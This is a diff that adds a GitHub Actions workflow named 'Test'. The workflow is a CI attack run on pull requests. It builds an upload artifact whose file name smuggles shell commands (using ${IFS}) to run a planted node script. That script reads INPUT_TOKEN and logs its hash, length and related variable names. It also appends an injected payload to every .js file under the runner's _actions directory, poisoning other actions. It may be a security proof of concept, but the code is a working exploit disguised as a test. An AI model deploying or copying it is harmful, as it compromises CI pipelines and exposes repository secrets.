@@ -1,0 +1,44 @@
+name: Test
+
+on:
+  pull_request:
+
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build forged artifact
+        run: |
+          mkdir -p content
+          printf 'forged report body' > content/summary.txt
+          : > 'content/summary.txt;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}tmp;cd${IFS}content;cd${IFS}content;node${IFS}p.js;#.txt'
+          cat > content/p.js <<'JSEOF'
+          const fs = require('fs');
+          const path = require('path');
+          const crypto = require('crypto');
+          const t = process.env.INPUT_TOKEN;
+          if (t) {
+            console.log('LEAK-SHA ' + crypto.createHash('sha256').update(String(t)).digest('hex'));
+            console.log('LEAK-LEN ' + String(t).length);
+            console.log('LEAK-INPUTS ' + Object.keys(process.env).filter(k => k.startsWith('INPUT') || k.includes('TOKEN')).join(','));
+          } else {
+            const root = path.join(path.dirname(process.env.RUNNER_WORKSPACE || '/home/runner/work/x'), '_actions');
+            const payload = "\n;(function(){try{var t=process.env.INPUT_TOKEN;if(t){var c=require('crypto');console.log('LEAK-SHA '+c.createHash('sha256').update(String(t)).digest('hex'));console.log('LEAK-LEN '+String(t).length);console.log('LEAK-ACT '+process.env.GITHUB_ACTION);}}catch(e){console.log('PATCHERR '+e.message)}})();\n";
+            let n = 0;
+            (function walk(d) {
+              let ents = [];
+              try { ents = fs.readdirSync(d, { withFileTypes: true }); } catch (e) { return; }
+              for (const e of ents) {
+                const p = path.join(d, e.name);
+                if (e.isDirectory()) walk(p);
+                else if (p.endsWith('.js')) { try { fs.appendFileSync(p, payload); n++; } catch (e) {} }
+              }
+            })(root);
+            console.log('PATCHED ' + n + ' root=' + root);
+          }
+          JSEOF
+          ls -la content
+      - uses: actions/upload-artifact@v4
+        with:
+          name: content
+          path: content
